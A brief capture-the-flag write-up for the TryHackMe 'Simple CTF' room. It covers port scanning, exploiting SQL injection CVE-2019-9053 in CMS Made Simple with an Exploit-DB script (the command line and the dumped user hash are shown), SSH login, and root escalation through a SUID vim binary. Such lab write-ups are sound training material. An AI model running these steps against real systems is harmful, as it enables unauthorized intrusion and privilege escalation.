# Simple CTF

[Simple CTF](https://tryhackme.com/room/easyctf)

## Solution

- nmap scan

21/tcp   open  ftp     vsftpd 3.0.3

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

- dirb scan

there is a dir `simple` where we find "This site is powered by CMS Made Simple
version 2.2.8"

after googling the version for a lot of the tools the
https://www.cvedetails.com/cve/CVE-2019-9053/ CVE seems to do the job. it is a
sql injection vulnerability.

can we try https://www.exploit-db.com/exploits/46635

I changed a bit the code, because it was python2... and who uses python2 in
2023? (change print to parenthesis print. and also install termcolors)
Also, my rockyou.txt is dumb and doesn't work, so I used john's.

`python exploit.py -u http://<ip>/simple --crack -w <wordlist>`

we get
- Salt for password found: 1dac0d92e9fa6bb2
- Username found: mitch
- Email found: admin@admin.com
- Password found: 0c01f4468bd75d7a84c7eb73846e8d96
- Password cracked: *******

next we can ssh into mitch's account

we can use the same strategy as before and see which binaries have SUID

`find / -user root -perm /4000`

in this case it was vim

so we can open vim and then run `:!bash` to open a shell with root user.
